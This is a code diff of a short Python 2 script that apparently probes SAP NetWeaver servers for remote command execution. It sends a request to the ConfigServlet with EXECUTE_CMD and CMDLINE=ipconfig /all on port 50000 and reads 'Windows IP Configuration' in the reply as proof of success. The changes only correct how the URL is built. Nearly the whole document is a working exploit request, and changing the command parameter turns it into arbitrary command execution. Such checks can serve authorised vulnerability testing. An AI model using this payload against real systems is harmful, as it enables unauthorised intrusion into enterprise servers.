@@ -19,12 +19,12 @@ def main(argv):
         return usage()
     
     host = sys.argv[1]
-    payload = "50000/ctc/servlet/com.sap.ctc.util.ConfigServlet?param=com.sap.ctc.util.FileSystemConfig;EXECUTE_CMD;CMDLINE=ipconfig%20/all"
+    payload = ":50000/ctc/servlet/com.sap.ctc.util.ConfigServlet?param=com.sap.ctc.util.FileSystemConfig;EXECUTE_CMD;CMDLINE=ipconfig%20/all"
     
-    print "[***] Checking {0} for Remote Code Execution".format(host, port)
+    print "[***] Checking {0} for Remote Code Execution".format(host)
     
     try:  
-        url = urllib.urlopen("http://{0}:{1}/{2}".format(host, port, payload))
+        url = urllib.urlopen("http://{0}{1}".format(host, payload))
         msg = url.read()
     
         if url.code == 200 and "Windows IP Configuration" in msg:
